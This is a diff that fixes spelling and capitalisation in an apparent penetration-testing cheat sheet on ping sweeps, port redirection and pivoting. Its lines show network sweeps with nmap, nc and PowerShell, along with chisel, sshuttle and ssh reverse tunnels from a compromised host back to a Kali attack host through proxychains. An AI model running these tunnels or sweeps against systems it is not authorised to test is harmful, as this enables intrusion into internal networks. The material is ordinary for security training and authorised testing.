@@ -3,7 +3,7 @@
 ## Ping Sweep
 
 ```shell
-# linux
+# Linux
 nmap -v -sn x.x.x.1-253
 nmap -sn x.x.x.0/24
 
@@ -11,10 +11,10 @@ for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
 for ip in 192.168.1.{1..254}; do ping -c1 -W1 $ip &>/dev/null && echo "$ip is up"; done
 fping -a -g 192.168.1.1 192.168.1.254 2>/dev/null
 
-# windows cmd
+# Windows CMD
 for /L %i in (1,1,254) do @ping -n 1 -w 100 192.168.1.%i | find "Reply"
-# windows ps
-1..254 | % {"172.16.6.$($_): $(Test-Connection -count 1 -comp 172.16.6.$($_) -quiet)"}
+# Windows PowerShell
+1..254 | % {"172.16.6.$($_): $(Test-Connection -Count 1 -ComputerName 172.16.6.$($_) -Quiet)"}
 ```
 
 ## Port Redirection
@@ -87,11 +87,11 @@ chisel server --port 8080 --reverse --socks5
 # create client on remote machine
 chisel client <local_host>:8080 R:socks
 
-# add the port asigned by chisel to /etc/proxychains.conf
+# add the port assigned by chisel to /etc/proxychains.conf
 # use proxychains to interact with the internal network 
 sudo proxychains <command>
 
-# create a client and add an extra port forwarding (useful to access a web page from browser)
+# create a client and add extra port forwarding (useful to access a web page from a browser)
 ./chisel client <local_host>:8080 R:socks R:4545:localhost:80
 ```
 
@@ -133,13 +133,13 @@ sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
 ### ssh.exe
 
 ```shell
-# creates a dynamic reverse tunnel between current host and attack host
+# creates a dynamic reverse tunnel between the current host and the attack host
 ssh -N -R 9998 kali@192.168.45.171
 
 # configure proxychains in /etc/proxychains4.conf
 socks5 127.0.0.1 9998
 
-# using proxychains to interact with 
+# use proxychains to interact with 
 sudo proxychains <command> <ip>
 ```
 
